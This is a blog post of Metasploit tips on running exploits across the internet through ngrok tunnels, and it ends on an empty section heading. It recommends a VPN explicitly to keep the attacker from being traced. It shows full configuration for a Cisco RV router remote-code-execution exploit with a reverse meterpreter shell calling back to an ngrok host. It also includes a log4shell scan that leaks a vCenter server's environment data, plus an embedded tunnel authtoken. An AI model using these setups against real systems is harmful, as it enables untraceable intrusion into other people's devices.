---
title: <span style="color:lime">Metasploit Tips and Tricks</span>
permalink: /tips-and-tricks/
author_profile: false
categories:
  - Metasploit
  - Tips
  - Tricks
tags:
  - ngrok
  - exploits
  - WAN
  - MSF
sidebar:
  - title: ""
    image: /assets/images/metasploit.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

## Introduction

Metasploit is the swiss army knive for hackers and it has tons of exploits that can be used in any engagement.
It comes in two versions, Open Source and Commercial, but our focus will be on the Open Source version called Metasploit Framework (MSF). 
The following sections do assume that the reader has a basic understanding how MSF works and that you have installed it on
your machine. In my case I am running Kali Linux on a Raspberry PI with MSF installed.

Check out the references below if you still need to install and understand Metasploit a bit better. 

[Metasploit Framework Tutorial](https://nooblinux.com/metasploit-tutorial/ "Metasploit Framework Tutorial")

[Metasploit Basics](https://null-byte.wonderhowto.com/how-to/metasploit-basics/ "Metasploit Basics")

## Tips and Tricks: Use MSF across the WAN
Doing a pentest or exploring exploits in the Wild requires a specific configuration in order for Metasploit exploits to work.
First of all your attacker machine should be reachable on a public IP address and specific ports should be open for the exploit to work.
And of course, you want to hide your tracks so that your attacker machine can not be traced back to you as owner.

Let's first tackle the public IP. Typically when you are behind a router/firewall at home with your service provider, you will get a public ip.
On Kali Linux, you can get this by running the command `curl ident.me`.

```shell
# curl ident.me
33.34.35.36┌──(root💀coolhostname)-[~]
```
This is your public IP assigned by your provider and it typically varies unless you have asked for a fixed public IP address.
Using this public IP address is not very helpfull in covering your tracks, so you typically want sign-up for a Virtual Private Network (VPN).
There are plenty of options such as NordVPN,  PureVPN, ExpressVPN, etc... where you can get a professional VPN service. 
Using VPN will provide you a public IP anywhere in the world that will hide your IP.

I am using ExpressVPN because it has a good world wide coverage and it uses OpenVPN profiles, which make it handy to use on Kali Linux or any other Linux distro.

So this is step one for your hiding your IP, but we still need to crack your network port openings for Metasploit to work across the WAN. 
There are several options to do this such as port forwarding either directly on your firwall or in Metasploit, but I prefer to use ngrok tunnels.

Ngrok tunnels will allow you to tunnel traffic thru your firewall without opening any port, because the tunnel is initiated from your attacker machine to the outside world.
This is pretty cool because I would like to keep my firewall closed without any ports open.

How does it work? 

First sign up with [ngrok](https://ngrok.com/ "ngrok") here. There is free subscription that provides you some free tcp and http(s) tunnels.

Download, install ngrok and setup your ngrok yaml configuration file with a tcp and http(s) tunnel.

```shell
# unzip /root/ngrok.zip
# ngrok config add-authtoken 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
# nano ./ngrok2/ngrok.yml
```
ngrok.yml example:

```text
authtoken: 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
log: /var/log/ngrok.log

tunnels:
  tcp1970:
    proto: tcp
    addr: 0.0.0.0:1970

  http1981:
    proto: http
    addr: 0.0.0.0:1981
```
Fire up ngrok.

```shell
# ngrok start -all --region eu
ngrok by @inconshreveable                                                                 (Ctrl+C to quit)

Session Status                online
Account                       "your name" (Plan: free)
Version                       2.3.40
Region                        Europe (eu)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://6.tcp.eu.ngrok.io:14594 -> 0.0.0.0:1970
Forwarding                    http://64db913882c5.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    https://64db913882c5.eu.ngrok.io -> http://0.0.0.0:1981

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```
Now let's use these tunnels in a Metasploit exploit setup.

In order for Metasploit to work with the ngrok tunnels, you need to specify the right parameters in Metasploit.
First of all you need to configure the `LHOST` and `LPORT` parameter which is your attacker machine. 

In a local NAT setup, you will configure your private IP and port here, but if you want to make it work across the WAN you need to configure the ngrok tunnel side that is accessible from the Internet.
In our case, using the command `set LHOST 6.tcp.eu.ngrok.io` and `set LPORT 14594`. 

However, do not forget to configure the other side of the ngrok tunnel in Metasploit to your local listener 0.0.0.0 that runs on port 1970.
This can be done by using the advanced option in MSF using the command `set ReverseListenerBindAddress 0.0.0.0` and `set ReverseListenerBindPort 1970`.

If you use an exploit with a http(s) stager using `SRVHOST` and `SRVPORT`, you need to do a similar configuration by applying the command `set SRVHOST 0.0.0.0` and `set SRVPORT 1981`.

Again with the advanced option, use the command `set URIHOST 64db913882c5.eu.ngrok.io` and `set URIPORT 80` to match the public accessible side of the ngrok http tunnel.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span> please notice that `LHOST` and `LPORT` mapping to ngrok is opposite versus the `SRVHOST` and `SRVPORT` mapping.
{: .notice--info}

The example below shows the ngrok setup for one of the newer exploits in MSF.

```shell
msf6 exploit(linux/http/cisco_rv_series_authbypass_and_rce) > options

Module options (exploit/linux/http/cisco_rv_series_authbypass_and_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     <TARGET-IP>      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      443              yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0
                                         .0.0 to listen on all addresses.
   SRVPORT    1981             yes       The local port to listen on.
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/armle/meterpreter/reverse_tcp):

   Name   Current Setting    Required  Description
   ----   ---------------    --------  -----------
   LHOST  6.tcp.eu.ngrok.io  yes       The listen address (an interface may be specified)
   LPORT  14594              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper

msf6 exploit(linux/http/cisco_rv_series_authbypass_and_rce) > advanced

Module advanced options (exploit/linux/http/cisco_rv_series_authbypass_and_rce):

   Name                    Current Setting                        Required  Description
   ----                    ---------------                        --------  -----------
   AllowNoCleanup          false                                  no        Allow exploitation without the possibility of cleaning up files
   AutoCheck               true                                   no        Run check before exploit
   CMDSTAGER::DECODER                                             no        The decoder stub to use.
   CMDSTAGER::FLAVOR       auto                                   no        The CMD Stager to use. (Accepted: auto, wget, curl)
   CMDSTAGER::SSL          false                                  no        Use SSL/TLS for supported stagers
   CMDSTAGER::TEMP                                                no        Writable directory for staged files
   ContextInformationFile                                         no        The information file that contains context information
   DOMAIN                  WORKSTATION                            yes       The domain to use for Windows authentication
   DigestAuthIIS           true                                   no        Conform to IIS, should work for most servers. Only set to false fo
                                                                            r non-IIS servers
   DisablePayloadHandler   false                                  no        Disable the handler code for the selected payload
   EXE::Custom                                                    no        Use custom exe instead of automatically generating a payload exe
   EXE::EICAR              false                                  no        Generate an EICAR file instead of regular payload exe
   EXE::FallBack           false                                  no        Use the default template in case the specified one is missing
   EXE::Inject             false                                  no        Set to preserve the original EXE function
   EXE::OldMethod          false                                  no        Set to use the substitution EXE generation method.
   EXE::Path                                                      no        The directory in which to look for the executable template
   EXE::Template                                                  no        The executable template file name.
   EnableContextEncoding   false                                  no        Use transient context when encoding payloads
   FileDropperDelay                                               no        Delay in seconds before attempting cleanup
   FingerprintCheck        true                                   no        Conduct a pre-exploit fingerprint verification
   ForceExploit            false                                  no        Override check result
   HttpClientTimeout                                              no        HTTP connection and receive timeout
   HttpPassword                                                   no        The HTTP password to specify for authentication
   HttpRawHeaders                                                 no        Path to ERB-templatized raw headers to append to existing headers
   HttpTrace               false                                  no        Show the raw HTTP requests and responses
   HttpTraceColors         red/blu                                no        HTTP request and response colors for HttpTrace (unset to disable)
   HttpTraceHeadersOnly    false                                  no        Show HTTP headers only in HttpTrace
   HttpUsername                                                   no        The HTTP username to specify for authentication
   ListenerBindAddress                                            no        The specific IP address to bind to if different from SRVHOST
   ListenerBindPort                                               no        The port to bind to if different from SRVPORT
   ListenerComm                                                   no        The specific communication channel to use for this service
   MSI::Custom                                                    no        Use custom msi instead of automatically generating a payload msi
   MSI::EICAR              false                                  no        Generate an EICAR file instead of regular payload msi
   MSI::Path                                                      no        The directory in which to look for the msi template
   MSI::Template                                                  no        The msi template file name
   MSI::UAC                false                                  no        Create an MSI with a UAC prompt (elevation to SYSTEM if accepted)
   SSLCipher                                                      no        String for SSL cipher spec - "DHE-RSA-AES256-SHA" or "ADH"
   SSLCompression          false                                  no        Enable SSL/TLS-level compression
   SSLVersion              Auto                                   yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are
                                                                             auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1,
                                                                            TLS1.2)
   SendRobots              false                                  no        Return a robots.txt file if asked for one
   URIHOST                 64db913882c5.eu.ngrok.io               no        Host to use in URI (useful for tunnels)
   URIPORT                 80                                     no        Port to use in URI (useful for tunnels)
   UserAgent               Mozilla/5.0 (Windows NT 10.0; Win64;   no        The User-Agent header to use for all requests
                           x64) AppleWebKit/537.36 (KHTML, like
                           Gecko) Chrome/98.0.4758.81 Safari/537
                           .36
   VERBOSE                 false                                  no        Enable detailed status messages
   WORKSPACE                                                      no        Specify the workspace for this module
   WfsDelay                5                                      no        Additional delay in seconds to wait for a session


Payload advanced options (linux/armle/meterpreter/reverse_tcp):

   Name                         Current Setting  Required  Description
   ----                         ---------------  --------  -----------
   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
   AutoRunScript                                 no        A script to run automatically on session creation.
   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
   EnableStageEncoding          false            no        Encode the second stage payload
   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
   MeterpreterDebugBuild        false            no        Use a debug version of Meterpreter
   MeterpreterTryToFork         true             no        Fork a new process if the functionality is available
   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
   PingbackRetries              0                yes       How many additional successful pingbacks
   PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through pro
                                                           xy but directly to LHOST
   ReverseListenerBindAddress   0.0.0.0          no        The specific IP address to bind to on the local system
   ReverseListenerBindPort      1970             no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                           no        The specific communication channel to use for this listener
   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is se
                                                           t
   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                      false            no        Enable detailed status messages
   WORKSPACE                                     no        Specify the workspace for this module
```
With this setup, your able to run your exploit across the WAN using the tunnels without any need for port forwarding or port openings on your firewall.

The other good thing with his setup is that you are hiding your tracks, because these tunnels are generated with a different FQDN every time you restart ngrok. 

But there is still more to explain...

Recently (April 2022), the Rapid7 team added an additional advanced configuration option called `ListenerBindAddress` and `ListenerBindPort`.

This looks quite similar as the *Reverse* variant so why is it there?

Let's not get confused here. These two parameters are also linked to the `SRVHOST` and `SRVPORT` used in the previous example, but in a different context.
In some exploits, the need arises for a local server not being a http(s) stager.
A good example is the log4shell scanner where there is a requirement to have a local rogue LDAP server to pull off the log4j vulnerability. 

You can read more about log4j in my other article [log4shell](/log4shell/ "log4shell") 

Anyhow, the example below, hunting down a vulnerable log4j VMWare vcenter server, shows the use of these new parameters in combination with the ngrok tunnel to run a log4shell scan across the WAN.
Bear in mind, that you need to setup your tunnel with a mapping to your local LDAP server (see the tcp389 entry in the ngrok yaml config).

Happy hunting...

./ngrok2/ngrok.yml:
```text
authtoken: 1su9qI65blhIGRTL3CwTsbKp5ml_3nH1bv5WA9HzfRhpmXTHJ
log: /var/log/ngrok.log

tunnels:
  tcp1970:
    proto: tcp
    addr: 0.0.0.0:1970

  http1981:
    proto: http
    addr: 0.0.0.0:1981
  
 tcp389:
    proto: tcp
    addr: 0.0.0.0:389    
```

```shell
# ngrok start -all --region eu
ngrok by @inconshreveable                                                                 (Ctrl+C to quit)

Session Status                online
Account                       "your name" (Plan: free)
Version                       2.3.40
Region                        Europe (eu)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://4.tcp.eu.ngrok.io:13743 -> 0.0.0.0:389
Forwarding                    http://50b9e65376c4.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    https://50b9e65376c4.eu.ngrok.io -> http://0.0.0.0:1981
Forwarding                    tcp://7.tcp.eu.ngrok.io:10560 -> 0.0.0.0:1970

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

```shell
msf6 auxiliary(scanner/http/log4shell_scanner) > set srvhost 4.tcp.eu.ngrok.io
srvhost => 4.tcp.eu.ngrok.io
msf6 auxiliary(scanner/http/log4shell_scanner) > set srvport 13743
srvport => 13743
msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindAddress 0.0.0.0
ListenerBindAddress => 0.0.0.0
msf6 auxiliary(scanner/http/log4shell_scanner) > set ListenerBindPort 389
ListenerBindPort => 389
msf6 auxiliary(scanner/http/log4shell_scanner) > set LEAK_PARAMS ${java:hw}^${env:PATH}
LEAK_PARAMS => ${java:hw}^${env:PATH}
msf6 auxiliary(scanner/http/log4shell_scanner) > options

Module options (auxiliary/scanner/http/log4shell_scanner):

   Name          Current Setting                           Required  Description
   ----          ---------------                           --------  -----------
   HEADERS_FILE  /root/http_headers.txt                    no        File containing headers to check
   HTTP_METHOD   GET                                       yes       The HTTP method to use
   LDAP_TIMEOUT  30                                        yes       Time in seconds to wait to receive LDAP connections
   LDIF_FILE                                               no        Directory LDIF file path
   LEAK_PARAMS    ${java:hw}^${env:PATH}                   no        Additional parameters to leak, separated by the ^ character (e.g., ${env
                                                                     :USER}^${env:PATH})
   Proxies                                                 no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.1                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         443                                       yes       The target port (TCP)
   SRVHOST       4.tcp.eu.ngrok.io                         yes       The local host or network interface to listen on. This must be an address
                                                                     on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       13743                                     yes       The local port to listen on.
   SSL           true                                      no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /                                         yes       The URI to scan
   THREADS       1                                         yes       The number of concurrent threads (max one per host)
   URIS_FILE     /root/http_uris.txt                       no        File containing additional URIs to check
   VHOST                                                   no        HTTP server virtual host

msf6 auxiliary(scanner/http/log4shell_scanner) > advanced

Module advanced options (auxiliary/scanner/http/log4shell_scanner):

   Name                               Current Setting                    Required  Description
   ----                               ---------------                    --------  -----------
   AddClassPath                                                          no        Additional java classpath
   DOMAIN                             WORKSTATION                        yes       The domain to use for Windows authentication
   DigestAuthIIS                      true                               no        Conform to IIS, should work for most servers. Only set to
                                                                                   false for non-IIS servers
   FingerprintCheck                   true                               no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                     no        HTTP connection and receive timeout
   HttpPassword                                                          no        The HTTP password to specify for authentication
   HttpRawHeaders                                                        no        Path to ERB-templatized raw headers to append to existing
                                                                                   headers
   HttpTrace                          false                              no        Show the raw HTTP requests and responses
   HttpTraceColors                    red/blu                            no        HTTP request and response colors for HttpTrace (unset to d
                                                                                   isable)
   HttpTraceHeadersOnly               false                              no        Show HTTP headers only in HttpTrace
   HttpUsername                                                          no        The HTTP username to specify for authentication
   JavaCache                          /root/.msf4/javacache              yes       Java cache location
   LDAP_AUTH_BYPASS                   true                               yes       Ignore LDAP client authentication
   LdapServerTcp                      true                               yes       Serve TCP LDAP requests
   LdapServerUdp                      true                               yes       Serve UDP LDAP requests
   ListenerBindAddress                0.0.0.0                            no        The specific IP address to bind to if different from SRVHO
                                                                                   ST
   ListenerBindPort                   389                                no        The port to bind to if different from SRVPORT
   ListenerComm                                                          no        The specific communication channel to use for this service
   Powershell::encode_final_payload   false                              yes       Encode final payload for -EncodedCommand
   Powershell::encode_inner_payload   false                              yes       Encode inner payload for -EncodedCommand
   Powershell::exec_in_place          false                              yes       Produce PSH without executable wrapper
   Powershell::exec_rc4               false                              yes       Encrypt PSH with RC4
   Powershell::method                 reflection                         yes       Payload delivery method (Accepted: net, reflection, old, m
                                                                                   sil)
   Powershell::no_equals              false                              yes       Pad base64 until no "=" remains
   Powershell::noninteractive         true                               yes       Execute powershell without interaction
   Powershell::persist                false                              yes       Run the payload in a loop
   Powershell::prepend_protections_b  auto                               yes       Prepend AMSI/SBL bypass (Accepted: auto, true, false)
   ypass
   Powershell::prepend_sleep                                             no        Prepend seconds of sleep
   Powershell::remove_comspec         false                              yes       Produce script calling powershell directly
   Powershell::strip_comments         true                               yes       Strip comments
   Powershell::strip_whitespace       false                              yes       Strip whitespace
   Powershell::sub_funcs              false                              yes       Substitute function names
   Powershell::sub_vars               true                               yes       Substitute variable names
   Powershell::wrap_double_quotes     true                               yes       Wraps the -Command argument in single quotes
   SSLVersion                         Auto                               yes       Specify the version of SSL/TLS to be used (Auto, TLS and S
                                                                                   SL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3
                                                                                   , TLS1, TLS1.1, TLS1.2)
   ShowProgress                       true                               yes       Display progress messages during a scan
   ShowProgressPercent                10                                 yes       The interval in percent that progress should be shown
   UserAgent                          Mozilla/5.0 (iPad; CPU OS 15_3_1   no        The User-Agent header to use for all requests
                                      like Mac OS X) AppleWebKit/605.1.
                                      15 (KHTML, like Gecko) Version/15
                                      .2 Mobile/15E148 Safari/604.1
   VERBOSE                            false                              no        Enable detailed status messages
   WORKSPACE                                                             no        Specify the workspace for this module

msf6 auxiliary(scanner/http/log4shell_scanner) > exploit

[+] 192.168.1.1:443     - Log4Shell found via /websso/SAML2/SSO/vsphere.local?SAMLRequest= (header: X-Forwarded-For) (os: Linux 4.19.191-1.ph3 unknown, architecture: amd64-64) (java: Azul Systems, Inc._1.8.0_291) 
(leaked: ${java:hw}=processors: 4, architecture: amd64-64  ${env:PATH}=/usr/local/bin:/usr/local/sbin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/java/jre-vmware/bin:/opt/vmware/bin)
[*] Sleeping 30 seconds for any last LDAP connections
[*] Server stopped.
[*] Auxiliary module execution completed
```
     

## Tips and Tricks: Using SMB pipes in MSF

